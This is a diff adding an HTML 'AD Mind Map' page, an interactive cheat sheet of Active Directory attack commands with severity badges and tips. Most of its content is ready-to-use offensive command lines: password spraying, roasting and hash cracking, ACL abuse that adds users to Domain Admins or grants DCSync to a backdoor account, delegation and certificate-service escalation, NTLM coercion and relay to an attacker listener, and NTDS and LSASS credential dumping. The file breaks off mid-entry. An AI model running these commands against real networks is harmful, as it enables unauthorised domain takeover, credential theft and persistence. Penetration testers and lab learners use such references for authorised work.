@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Mind Map — @ethicalsoup</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.9.0/d3.min.js"></script>
+<style>
+:root{
+  --bg:#0a0c0f;--bg2:#0f1215;--bg3:#141820;--border:#1e2530;
+  --accent:#00d4aa;--accent2:#ff6b35;--accent4:#f7c948;
+  --text:#c8d4e0;--textd:#5a6a7a;
+  --green:#4ec94e;--red:#ff4d6a;--blue:#4d9fff;--purple:#b06aff;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:500;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,170,.007) 2px,rgba(0,212,170,.007) 4px)}
+
+/* ── SHARED HEADER ── */
+#header{
+  position:fixed;top:0;left:0;right:0;height:48px;
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:14px;padding:0 18px;z-index:600;
+}
+.logo{font-family:'Syne',sans-serif;font-weight:800;font-size:14px;color:#fff;letter-spacing:-.01em}
+.logo span{color:var(--accent)}
+.hsep{color:var(--border)}
+.hmeta{font-size:10px;color:var(--textd);letter-spacing:.07em;text-transform:uppercase}
+#node-count{font-size:10px;color:var(--textd);letter-spacing:.07em;text-transform:uppercase}
+#header-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+#search{
+  background:var(--bg3);border:1px solid var(--border);border-radius:4px;
+  color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;
+  padding:5px 10px;width:200px;outline:none;transition:border-color .15s;
+}
+#search:focus{border-color:var(--accent)}
+#search::placeholder{color:var(--textd)}
+#match-count{font-size:10px;color:var(--textd);min-width:52px;text-align:right}
+#btn-cards{
+  background:var(--bg3);border:1px solid var(--border);border-radius:4px;
+  color:var(--textd);font-family:'JetBrains Mono',monospace;font-size:10px;
+  padding:5px 10px;cursor:pointer;letter-spacing:.05em;transition:all .15s;
+  text-transform:uppercase;
+}
+#btn-cards:hover{border-color:var(--accent);color:var(--accent)}
+#btn-cards.active{border-color:var(--accent);color:var(--accent);background:rgba(0,212,170,.08)}
+
+/* ── PAGE 1: FULL-SCREEN MAP ── */
+#map-section{
+  width:100vw;height:100vh;padding-top:48px;
+  position:relative;overflow:hidden;
+}
+#mindmap{width:100%;height:100%;cursor:grab;display:block}
+#mindmap:active{cursor:grabbing}
+
+/* D3 styles */
+.link{fill:none;stroke-opacity:.5;transition:stroke-opacity .15s}
+.link.dimmed{stroke-opacity:.06}
+.link.lit{stroke-opacity:1}
+.node circle{cursor:pointer;transition:r .12s}
+.node text{
+  font-family:'JetBrains Mono',monospace;pointer-events:none;dominant-baseline:central;
+  paint-order:stroke;stroke:#0a0c0f;stroke-width:4px;stroke-linejoin:round;
+}
+.node.dimmed circle{opacity:.1}
+.node.dimmed text{opacity:.1}
+
+/* ── MAP UI OVERLAYS ── */
+#map-controls{position:absolute;bottom:20px;right:20px;display:flex;flex-direction:column;gap:6px;z-index:10}
+.mc-btn{
+  background:var(--bg2);border:1px solid var(--border);color:var(--textd);
+  font-family:'JetBrains Mono',monospace;font-size:15px;
+  width:30px;height:30px;border-radius:4px;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;transition:all .15s;
+}
+.mc-btn:hover{border-color:var(--accent);color:var(--accent)}
+
+#legend{
+  position:absolute;bottom:20px;left:20px;
+  background:rgba(10,12,15,.9);border:1px solid var(--border);
+  border-radius:6px;padding:10px 14px;z-index:10;
+  backdrop-filter:blur(4px);
+}
+#legend .lg-title{
+  font-family:'Syne',sans-serif;font-size:9px;font-weight:700;
+  letter-spacing:.15em;text-transform:uppercase;color:var(--textd);margin-bottom:6px;
+}
+.lg-row{display:flex;align-items:center;gap:7px;font-size:10px;color:var(--text);
+  line-height:2;cursor:pointer;transition:color .15s}
+.lg-row:hover{color:var(--accent)}
+.lg-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+
+#map-hint{
+  position:absolute;bottom:20px;left:50%;transform:translateX(-50%);
+  background:rgba(10,12,15,.85);border:1px solid var(--border);
+  border-radius:3px;padding:4px 12px;font-size:9px;color:var(--textd);
+  white-space:nowrap;letter-spacing:.04em;pointer-events:none;
+  backdrop-filter:blur(4px);
+}
+#map-hint kbd{
+  background:var(--bg3);border:1px solid var(--border);
+  border-radius:2px;padding:1px 4px;font-family:inherit;
+}
+
+/* scroll-down arrow */
+#scroll-arrow{
+  position:absolute;bottom:20px;left:50%;transform:translateX(-50%) translateX(120px);
+  width:32px;height:32px;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.25);
+  border-radius:50%;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:var(--accent);font-size:16px;transition:all .2s;z-index:10;
+  animation:bounce 2s infinite;
+}
+#scroll-arrow:hover{background:rgba(0,212,170,.2)}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateX(120px) translateY(0)}50%{transform:translateX(-50%) translateX(120px) translateY(-5px)}}
+
+/* mini tooltip */
+#mini-tip{
+  position:fixed;background:var(--bg3);border:1px solid var(--border);
+  border-radius:3px;padding:3px 9px;font-size:10px;color:var(--text);
+  pointer-events:none;opacity:0;transition:opacity .08s;z-index:700;white-space:nowrap;
+}
+#mini-tip.show{opacity:1}
+
+/* ── PAGE 2: CARDS ── */
+#cards-section{
+  min-height:100vh;padding:64px 0 80px;
+  border-top:2px solid var(--border);
+  position:relative;
+}
+#cards-top-bar{
+  position:sticky;top:48px;background:var(--bg);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:12px;padding:8px 24px;z-index:400;
+  font-size:10px;color:var(--textd);letter-spacing:.07em;text-transform:uppercase;
+}
+#btn-back-map{
+  background:var(--bg3);border:1px solid var(--border);color:var(--textd);
+  font-family:'JetBrains Mono',monospace;font-size:10px;padding:4px 10px;
+  border-radius:4px;cursor:pointer;letter-spacing:.05em;transition:all .15s;
+  text-transform:uppercase;
+}
+#btn-back-map:hover{border-color:var(--accent);color:var(--accent)}
+#active-card-label{color:var(--accent);font-weight:700;margin-left:4px}
+
+.branch-section{padding-bottom:4px}
+.branch-header{
+  display:flex;align-items:center;gap:10px;padding:20px 24px 10px;
+  font-family:'Syne',sans-serif;font-size:10px;font-weight:700;
+  letter-spacing:.18em;text-transform:uppercase;color:var(--textd);
+  border-bottom:1px solid var(--border);
+  position:sticky;top:89px;background:var(--bg);z-index:10;
+}
+.branch-header::after{content:'';flex:1;height:1px;background:var(--border)}
+.bh-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.bh-num{color:var(--accent);margin-right:2px}
+
+.cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(420px,1fr));gap:14px;padding:14px 24px}
+
+.ref-card{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;transition:border-color .2s;
+  scroll-margin-top:100px;
+}
+.ref-card:hover{border-color:#3a4555}
+.ref-card.flash{
+  border-color:var(--accent) !important;
+  box-shadow:0 0 20px rgba(0,212,170,.2);
+  animation:flashpulse .8s ease-out;
+}
+@keyframes flashpulse{
+  0%{box-shadow:0 0 0 rgba(0,212,170,0)}
+  30%{box-shadow:0 0 24px rgba(0,212,170,.35)}
+  100%{box-shadow:0 0 12px rgba(0,212,170,.1)}
+}
+
+.card-head{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);
+  gap:10px;
+}
+.card-title{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.04em;color:#fff}
+.sev-badge{font-size:9px;padding:2px 7px;border-radius:3px;letter-spacing:.06em;font-weight:700;white-space:nowrap}
+.sev-crit{background:rgba(255,77,106,.18);color:var(--red);border:1px solid rgba(255,77,106,.35)}
+.sev-high{background:rgba(255,107,53,.15);color:var(--accent2);border:1px solid rgba(255,107,53,.3)}
+.sev-med{background:rgba(247,201,72,.12);color:var(--accent4);border:1px solid rgba(247,201,72,.25)}
+.sev-info{background:rgba(0,212,170,.10);color:var(--accent);border:1px solid rgba(0,212,170,.2)}
+
+.card-body{padding:10px 14px;display:flex;flex-direction:column;gap:8px}
+.card-tools{font-size:10px}
+.tools-lbl{color:var(--textd);letter-spacing:.06em}
+.tools-val{color:var(--accent)}
+
+.code-wrap{background:#060709;border:1px solid var(--border);border-radius:4px;position:relative;overflow:hidden}
+.code-pre{
+  font-family:'JetBrains Mono',monospace;font-size:11px;color:#c3e88d;
+  line-height:1.65;white-space:pre;overflow-x:auto;padding:10px 12px;
+  user-select:text;cursor:text;max-height:280px;overflow-y:auto;
+}
+.code-pre::-webkit-scrollbar{width:3px;height:3px}
+.code-pre::-webkit-scrollbar-thumb{background:var(--border)}
+.copy-btn{
+  position:absolute;top:6px;right:6px;background:var(--bg3);border:1px solid var(--border);
+  color:var(--textd);font-family:'JetBrains Mono',monospace;font-size:9px;
+  padding:2px 8px;border-radius:3px;cursor:pointer;letter-spacing:.05em;transition:all .15s;z-index:1;
+}
+.copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+.copy-btn.copied{border-color:var(--green);color:var(--green)}
+
+.tip-box{padding:6px 10px;font-size:10.5px;line-height:1.55;border-radius:0 4px 4px 0;
+  color:#90d4c8;background:rgba(0,212,170,.05);border:1px solid rgba(0,212,170,.15);border-left:3px solid var(--accent)}
+.gotcha-box{padding:6px 10px;font-size:10.5px;line-height:1.55;border-radius:0 4px 4px 0;
+  color:#e0a0a8;background:rgba(255,77,106,.05);border:1px solid rgba(255,77,106,.15);border-left:3px solid var(--red)}
+
+@media(max-width:900px){.cards-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<!-- HEADER (fixed, always visible) -->
+<div id="header">
+  <div class="logo">AD <span>Mind Map</span></div>
+  <div class="hsep">|</div>
+  <div class="hmeta">@ethicalsoup</div>
+  <div class="hsep">|</div>
+  <div id="node-count" class="hmeta">loading…</div>
+  <div id="header-right">
+    <input id="search" type="text" placeholder="Search techniques, tools…" autocomplete="off" spellcheck="false">
+    <div id="match-count"></div>
+    <button id="btn-cards">Reference ↓</button>
+  </div>
+</div>
+
+<!-- PAGE 1: FULL-SCREEN MIND MAP -->
+<section id="map-section">
+  <svg id="mindmap"></svg>
+
+  <div id="map-controls">
+    <button class="mc-btn" id="btn-expand"   title="Expand all">+</button>
+    <button class="mc-btn" id="btn-collapse" title="Collapse all">−</button>
+    <button class="mc-btn" id="btn-reset"    title="Reset view">⊙</button>
+  </div>
+
+  <div id="legend"><div class="lg-title">Categories</div></div>
+
+  <div id="map-hint">
+    <kbd>Scroll</kbd> zoom &nbsp;·&nbsp;
+    <kbd>Drag</kbd> pan &nbsp;·&nbsp;
+    <kbd>Click branch</kbd> collapse &nbsp;·&nbsp;
+    <kbd>Click node</kbd> jump to reference
+  </div>
+
+  <div id="scroll-arrow" title="Jump to reference cards">↓</div>
+</section>
+
+<!-- PAGE 2: REFERENCE CARDS -->
+<section id="cards-section">
+  <div id="cards-top-bar">
+    <button id="btn-back-map">↑ Back to Map</button>
+    <span>Active Directory Arsenal</span>
+    <span id="active-card-label"></span>
+  </div>
+  <div id="cards-body"></div>
+</section>
+
+<div id="mini-tip"></div>
+
+<script>
+// ════════════════════════════════════════════════════
+// DATA
+// ════════════════════════════════════════════════════
+const SEV={crit:'CRITICAL',high:'HIGH',med:'MEDIUM',info:'INFO'};
+const slug=n=>n.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'');
+const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+const BRANCHES=[
+  {name:"No Credentials",color:"#4d9fff",children:[
+    {name:"LDAP Anon Bind",sev:"high",tool:"ldapsearch / windapsearch",
+     cmd:`ldapsearch -x -H ldap://DC_IP -b "" -s base namingContexts
+ldapsearch -x -H ldap://DC_IP \\
+  -b "DC=domain,DC=local" \\
+  "(objectClass=user)" sAMAccountName description`,
+     tips:["Naming context reveals base DN. Check for anonymous bind before assuming creds are needed."]},
+    {name:"SMB Null Session",sev:"high",tool:"smbclient / enum4linux-ng / nxc",
+     cmd:`enum4linux-ng -A DC_IP
+smbclient -L //DC_IP -N
+nxc smb DC_IP -u '' -p '' --shares`},
+    {name:"RPC Null Session",sev:"high",tool:"rpcclient",
+     cmd:`rpcclient -U "" -N DC_IP
+  > enumdomusers
+  > enumdomgroups
+  > getdompwinfo`,
+     gotchas:["getdompwinfo reveals lockout threshold — run BEFORE any credential attack"]},
+    {name:"Password Policy",sev:"crit",tool:"enum4linux-ng / nxc",
+     cmd:`nxc smb DC_IP -u '' -p '' --pass-pol
+enum4linux-ng -P DC_IP`,
+     gotchas:["ALWAYS retrieve before spraying. 3-attempt envs: use Kerberoast/AS-REP instead of spray."]},
+    {name:"Kerbrute UserEnum",sev:"high",tool:"kerbrute",
+     cmd:`kerbrute userenum --dc DC_IP -d domain.local \\
+  users.txt -o valid_users.txt`,
+     tips:["No lockout risk — PREAUTH_REQUIRED = valid user. Safe against strict lockout envs."]},
+    {name:"LLMNR/NBT-NS Poison",sev:"high",tool:"Responder",
+     cmd:`responder -I tun0 -wv
+# Crack NTLMv2:
+hashcat -m 5600 ntlmv2.txt rockyou2021.txt \\
+  -r rules/rockyou-30000.rule`,
+     gotchas:["Disable SMB+HTTP in Responder.conf when relaying — or Responder intercepts before ntlmrelayx"]},
+  ]},
+  {name:"Initial Access",color:"#ff6b35",children:[
+    {name:"Password Spray",sev:"crit",tool:"kerbrute / nxc",
+     cmd:`# Kerbrute — Kerberos (stealthier)
+kerbrute passwordspray --dc DC_IP -d domain.local \\
+  valid_users.txt 'Spring2025!'
+
+# NetExec
+nxc smb DC_IP -u valid_users.txt -p 'Spring2025!' \\
+  --no-bruteforce --continue-on-success
+
+# Candidates: Spring2025! CompanyName2024! Welcome1! P@ssw0rd`,
+     gotchas:["One password per round. Wait full observation window. 3-attempt envs — DO NOT SPRAY."]},
+    {name:"AS-REP Roasting",sev:"crit",tool:"GetNPUsers.py / nxc",
+     cmd:`GetNPUsers.py domain.local/ \\
+  -dc-ip DC_IP -usersfile valid_users.txt \\
+  -format hashcat -outputfile asrep.txt
+
+nxc ldap DC_IP -u user -p 'pass' --asreproast asrep.txt
+
+hashcat -m 18200 asrep.txt rockyou2021.txt \\
+  -r rules/rockyou-30000.rule`,
+     gotchas:["hashcat --username required when file is user:hash format"]},
+    {name:"Kerberoasting",sev:"crit",tool:"GetUserSPNs.py / Rubeus",
+     cmd:`GetUserSPNs.py domain.local/user:'pass' \\
+  -dc-ip DC_IP -request -outputfile kerb.txt
+
+Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt
+
+hashcat -m 13100 kerb.txt rockyou2021.txt \\
+  -r rules/rockyou-30000.rule`,
+     tips:["RC4 tickets crack faster than AES. Target: svc_*, sql_*, backup_* SPNs."]},
+  ]},
+  {name:"Auth Enumeration",color:"#00d4aa",children:[
+    {name:"BloodHound",sev:"crit",tool:"bloodhound-python / SharpHound",
+     cmd:`bloodhound-python -u user -p 'pass' \\
+  -d domain.local -dc DC_FQDN \\
+  -ns DC_IP -c All --zip
+
+bloodhound-python -u user --hashes :NTHASH \\
+  -d domain.local -ns DC_IP -c All
+
+SharpHound.exe -c All --zipfilename bh.zip`,
+     tips:["Run immediately on domain foothold. Mark owned accounts → Shortest Paths to DA."]},
+    {name:"BloodHound Queries",sev:"high",tool:"Cypher",
+     cmd:`-- Owned → DA
+MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group
+  {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+-- Kerberoastable
+MATCH (u:User {hasspn:true}) RETURN u.name, u.description
+
+-- AS-REP roastable
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+
+-- Unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true,
+  name<>"DC01.DOMAIN.LOCAL"}) RETURN c.name`},
+    {name:"PowerView",sev:"high",tool:"PowerView.ps1",
+     cmd:`Get-DomainUser -SPN                 # Kerberoastable
+Get-DomainUser -PreauthNotRequired   # AS-REP roastable
+Get-DomainComputer -Unconstrained    # Unconstrained deleg
+Get-DomainComputer -TrustedToAuth    # Constrained deleg
+Find-InterestingDomainAcl -ResolveGUIDs |
+  Where-Object { $_.IdentityReferenceName -match "OWNED" }
+Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match
+    "GenericAll|GenericWrite|WriteOwner|WriteDACL" }`},
+    {name:"NetExec Sweep",sev:"high",tool:"nxc",
+     cmd:`nxc ldap DC_IP -u user -p 'pass' --users
+nxc ldap DC_IP -u user -p 'pass' --groups
+nxc smb SUBNET/24 -u user -p 'pass' --loggedon-users
+nxc smb SUBNET/24 -u user -p 'pass' --shares
+nxc smb DC_IP -u user -p 'pass' -M gpp_password
+nxc smb TARGET -u admin -H HASH -M lsassy`},
+    {name:"Share Hunting",sev:"high",tool:"nxc / manspider",
+     cmd:`nxc smb SUBNET/24 -u user -p 'pass' --shares
+nxc smb TARGET -u user -p 'pass' -M spider_plus
+manspider SUBNET/24 -u user -p 'pass' \\
+  -e txt xml conf bak ps1 bat cmd vbs`,
+     tips:["Hunt for: passwords, connection strings, scripts, SQL configs, SSH keys"]},
+    {name:"LDAP Queries",sev:"med",tool:"ldapsearch",
+     cmd:`# Users with descriptions (often contain passwords)
+ldapsearch -x -H ldap://DC_IP -D user@domain -w 'pass' \\
+  -b "DC=domain,DC=local" "(objectClass=user)" \\
+  sAMAccountName description | grep -A1 "description:"
+
+# Machine Account Quota (RBCD prereq — default 10)
+ldapsearch -x -H ldap://DC_IP -D user@domain -w 'pass' \\
+  -b "DC=domain,DC=local" "(objectClass=domain)" \\
+  ms-DS-MachineAccountQuota`},
+  ]},
+  {name:"ACL Abuse",color:"#ff4d6a",children:[
+    {name:"ACL Edge Reference",sev:"crit",tool:"BloodHound → PowerView",
+     cmd:`# GenericAll   → User:     Shadow Creds, Force Pwd, SPN set
+# GenericAll   → Group:    Add member
+# GenericAll   → Computer: RBCD
+# GenericWrite → User:     Shadow Creds, SPN set → Kerberoast
+# GenericWrite → Computer: RBCD
+# WriteDACL   → Any:      Grant GenericAll
+# WriteOwner  → Any:      Take ownership → WriteDACL → GenericAll
+# AllExtended → User:     ForceChangePassword
+# AddMember   → Group:    Add self to group
+# DS-Replicate→ Domain:   DCSync`,
+     tips:["Re-run BloodHound after each privilege gain — new paths open after every lateral move"]},
+    {name:"Shadow Credentials",sev:"crit",tool:"certipy-ad / pywhisker",
+     cmd:`certipy-ad shadow auto \\
+  -u attacker@domain.local -p 'pass' \\
+  -dc-ip DC_IP -account targetuser
+# → targetuser.ccache + NT hash
+
+# pywhisker manual
+python3 pywhisker.py -d domain.local -u attacker \\
+  -p 'pass' --dc-ip DC_IP \\
+  --target targetuser --action add
+python3 gettgtpkinit.py \\
+  -cert-pfx DEVICE_ID.pfx -pfx-pass 'CERT_PASS' \\
+  domain.local/targetuser targetuser.ccache
+python3 getnthash.py domain.local/targetuser -key AS_REP_KEY
+
+# Cleanup
+certipy-ad shadow clear \\
+  -u attacker@domain.local -p 'pass' \\
+  -dc-ip DC_IP -account targetuser`,
+     tips:["No lockout risk. No password change. Target continues functioning normally."],
+     gotchas:["Requires PKINIT/ADCS in domain. No CA → fallback to ForceChangePassword or SPN-set Kerberoast"]},
+    {name:"ForceChangePassword",sev:"high",tool:"rpcclient / PowerView",
+     cmd:`rpcclient -U "domain/attacker%pass" DC_IP
+  > setuserinfo2 targetuser 23 'NewPass123!'
+
+$p=ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity targetuser -AccountPassword $p`},
+    {name:"Add Member to Group",sev:"high",tool:"PowerView / net",
+     cmd:`Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
+net group "Domain Admins" attacker /add /domain`,
+     gotchas:["net group without /domain targets LOCAL groups only. Always include /domain for AD."]},
+    {name:"WriteDACL → GenericAll",sev:"high",tool:"PowerView",
+     cmd:`Add-DomainObjectAcl \\
+  -TargetIdentity targetuser \\
+  -PrincipalIdentity attacker \\
+  -Rights All
+# Cleanup after:
+Remove-DomainObjectAcl \\
+  -TargetIdentity targetuser \\
+  -PrincipalIdentity attacker -Rights All`},
+    {name:"WriteOwner → Escalate",sev:"high",tool:"PowerView",
+     cmd:`Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker
+Add-DomainObjectAcl -TargetIdentity targetuser \\
+  -PrincipalIdentity attacker -Rights WriteDacl
+Add-DomainObjectAcl -TargetIdentity targetuser \\
+  -PrincipalIdentity attacker -Rights All`},
+    {name:"DS-Replication",sev:"crit",tool:"PowerView / secretsdump",
+     cmd:`Add-DomainObjectAcl \\
+  -TargetIdentity "DC=domain,DC=local" \\
+  -PrincipalIdentity backdoor_user -Rights DCSync
+
+secretsdump.py domain/backdoor_user:'pass'@DC_IP`},
+  ]},
+  {name:"Delegation",color:"#b06aff",children:[
+    {name:"Find Delegation Hosts",sev:"med",tool:"PowerView",
+     cmd:`Get-DomainComputer -Unconstrained | Select dnshostname
+Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto`},
+    {name:"Unconstrained Deleg",sev:"crit",tool:"Rubeus + Coercer",
+     cmd:`Rubeus.exe monitor /interval:5 /nowrap
+
+python3 printerbug.py 'domain/user:pass@DC_IP' UNCON_HOST
+# OR
+coercer coerce -u user -p 'pass' -d domain.local \\
+  --listener UNCON_HOST --target DC_IP
+
+Rubeus.exe ptt /ticket:BASE64_TGT
+secretsdump.py -k -no-pass DC_FQDN`,
+     tips:["Check Spooler first: nxc smb DC_IP -M spooler"]},
+    {name:"Constrained Deleg",sev:"crit",tool:"Rubeus / getST.py",
+     cmd:`Rubeus.exe asktgt /user:svc_account /password:'pass' /nowrap
+Rubeus.exe s4u /ticket:TGT \\
+  /impersonateuser:administrator \\
+  /msdsspn:"cifs/TARGET.domain.local" /ptt
+
+getST.py -spn 'cifs/TARGET.domain.local' \\
+  -impersonate administrator \\
+  -dc-ip DC_IP 'domain.local/svc:pass'
+export KRB5CCNAME=administrator@cifs_TARGET.ccache
+secretsdump.py -k -no-pass TARGET.domain.local`},
+    {name:"RBCD",sev:"crit",tool:"addcomputer.py / rbcd.py / getST.py",
+     cmd:`addcomputer.py -computer-name 'RBCD$' \\
+  -computer-pass 'RBCDPass123!' \\
+  -dc-ip DC_IP 'domain.local/user:pass'
+
+rbcd.py -dc-ip DC_IP -action write \\
+  -delegate-to 'TARGET$' -delegate-from 'RBCD$' \\
+  'domain.local/user:pass'
+
+getST.py -spn 'cifs/TARGET.domain.local' \\
+  -impersonate administrator -dc-ip DC_IP \\
+  'domain.local/RBCD$:RBCDPass123!'
+
+export KRB5CCNAME=administrator@cifs_TARGET.domain.local.ccache
+secretsdump.py -k -no-pass TARGET.domain.local`,
+     gotchas:["MAQ defaults to 10. If MAQ=0 you need existing machine account creds."]},
+  ]},
+  {name:"ADCS",color:"#f7c948",children:[
+    {name:"Find Vulnerabilities",sev:"high",tool:"certipy-ad / escalate.py",
+     cmd:`certipy-ad find -u user@domain.local \\
+  -p 'pass' -dc-ip DC_IP -vulnerable
+
+python3 escalate.py -dc DC_IP -d domain.local \\
+  -u user -p 'pass' --actionable`},
+    {name:"ESC1 — SAN Injection",sev:"crit",tool:"certipy-ad",
+     cmd:`certipy-ad req \\
+  -u user@domain.local -p 'pass' \\
+  -dc-ip DC_IP -ca 'CA-NAME' \\
+  -template 'VULN_TEMPLATE' \\
+  -upn administrator@domain.local
+
+certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
+evil-winrm -i DC_IP -u administrator -H NTHASH`},
+    {name:"ESC2 — Any EKU",sev:"high",tool:"certipy-ad",
+     cmd:`# Any Purpose EKU or no EKU → use cert for any auth
+# Enroll → use for Schannel or PKINIT auth`},
+    {name:"ESC3 — Agent",sev:"high",tool:"certipy-ad",
+     cmd:`# Certificate Request Agent EKU
+certipy-ad req ... -on-behalf-of 'domain\\administrator'`},
+    {name:"ESC4 — Write Tpl",sev:"high",tool:"certipy-ad template",
+     cmd:`certipy-ad template -template TEMPLATE -save-old
+# Modify to add ESC1 flags, then exploit as ESC1`},
+    {name:"ESC6 — CA Flag",sev:"crit",tool:"certipy-ad",
+     cmd:`# EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
+certipy-ad req \\
+  -u user@domain.local -p 'pass' \\
+  -dc-ip DC_IP -ca 'CA-NAME' \\
+  -template User \\
+  -upn administrator@domain.local
+certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP`},
+    {name:"ESC7 — ManageCA",sev:"high",tool:"certipy-ad ca",
+     cmd:`certipy-ad ca -ca 'CA-NAME' -add-officer attacker \\
+  -u user@domain.local -p 'pass' -dc-ip DC_IP
+certipy-ad ca -ca 'CA-NAME' \\
+  -enable-attribute-subjectaltname2 \\
+  -u attacker@domain.local -p 'pass' -dc-ip DC_IP`},
+    {name:"ESC8 — Web Relay",sev:"crit",tool:"ntlmrelayx + PetitPotam",
+     cmd:`# Responder.conf: SMB=Off, HTTP=Off
+ntlmrelayx.py \\
+  -t http://CA_HOST/certsrv/certfnsh.asp \\
+  --adcs --template DomainController -smb2support
+responder -I tun0 -wv
+python3 PetitPotam.py -u user -p 'pass' \\
+  -d domain.local KALI_IP DC_IP
+certipy-ad auth -pfx dc.pfx -dc-ip DC_IP
+secretsdump.py -hashes :DC_NTHASH 'domain/DC01$@DC_IP'`,
+     gotchas:["3-tool coordination. Responder MUST have SMB=Off or it intercepts before relay"]},
+    {name:"ESC16 — UPN Swap",sev:"crit",tool:"certipy-ad account",
+     cmd:`# 1. Set UPN to administrator
+certipy-ad account \\
+  -u writer@domain.local -p 'pass' \\
+  -dc-ip DC_IP -user OWNED -upn administrator@domain.local update
+
+# 2. Request cert
+certipy-ad req \\
+  -u OWNED@domain.local -hashes :NTHASH \\
+  -dc-ip DC_IP -ca 'CA-NAME' -template User
+
+# 3. Restore UPN IMMEDIATELY
+certipy-ad account \\
+  -u writer@domain.local -p 'pass' \\
+  -dc-ip DC_IP -user OWNED -upn OWNED@domain.local update
+
+# 4. Auth
+certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
+evil-winrm -i DC_IP -u administrator -H NTHASH`,
+     tips:["UPN swap only — NOT SubCA path. CA stamps whatever UPN the account has into SAN. Fluffy HTB."]},
+  ]},
+  {name:"Coercion + Relay",color:"#ff9a3c",children:[
+    {name:"Responder Capture",sev:"high",tool:"Responder",
+     cmd:`responder -I tun0 -wv
+hashcat -m 5600 ntlmv2.txt rockyou2021.txt \\
+  -r rules/rockyou-30000.rule`,
+     gotchas:["Capture mode: SMB+HTTP on. Relay mode: both Off in Responder.conf"]},
+    {name:"ntlmrelayx",sev:"crit",tool:"impacket",
+     cmd:`nxc smb SUBNET/24 --gen-relay-list relay_targets.txt
+
+ntlmrelayx.py -tf relay_targets.txt -smb2support
+ntlmrelayx.py -t ldap://DC_IP \\
+  --delegate-access --escalate-user RBCD$
+ntlmrelayx.py \\
+  -t http://CA_HOST/certsrv/certfnsh.asp \\
+  --adcs --template DomainController`,
+     gotchas:["Cannot relay to the same host. DCs always have SMB signing ON."]},
+    {name:"PetitPotam",sev:"high",tool:"PetitPotam.py",
+     cmd:`python3 PetitPotam.py \\
+  -u user -p 'pass' -d domain.local \\
+  KALI_IP DC_IP`},
+    {name:"PrinterBug",sev:"high",tool:"printerbug.py",
+     cmd:`nxc smb DC_IP -u user -p 'pass' -M spooler
+python3 printerbug.py 'domain/user:pass@DC_IP' KALI_IP`},
+    {name:"Coercer (all methods)",sev:"high",tool:"coercer",
+     cmd:`coercer coerce \\
+  -u user -p 'pass' -d domain.local \\
+  --listener KALI_IP --target DC_IP`},
+    {name:"WebDAV Coercion",sev:"crit",tool:"coercer + ntlmrelayx",
+     cmd:`nxc smb TARGET -u user -p 'pass' -M webdav
+
+ntlmrelayx.py -t ldap://DC_IP --delegate-access
+
+coercer coerce \\
+  -u user -p 'pass' -d domain.local \\
+  --listener KALI_IP@80/test --target TARGET_IP`,
+     tips:["HTTP coercion bypasses SMB signing. RBCD via WebDAV works where SMB relay fails on DCs. Trilocor pattern."]},
+  ]},
+  {name:"Credential Dumping",color:"#4ec94e",children:[
+    {name:"DCSync",sev:"crit",tool:"secretsdump.py",
+     cmd:`secretsdump.py -hashes :NTHASH administrator@DC_IP
+secretsdump.py -k -no-pass DC_FQDN
+secretsdump.py -hashes :NTHASH administrator@DC_IP \\
+  -just-dc-user krbtgt`},
+    {name:"NTDS.dit (VSS)",sev:"crit",tool:"vssadmin / nxc",
+     cmd:`vssadmin create shadow /for=C:
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit" C:\\Temp\\
+copy "...\\System32\\config\\SYSTEM" C:\\Temp\\
+
+nxc smb DC_IP -u admin -H NTHASH --ntds vss
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`},
+    {name:"LSASS Dump",sev:"crit",tool:"lsassy / pypykatz",
+     cmd:`nxc smb TARGET -u admin -H NTHASH -M lsassy
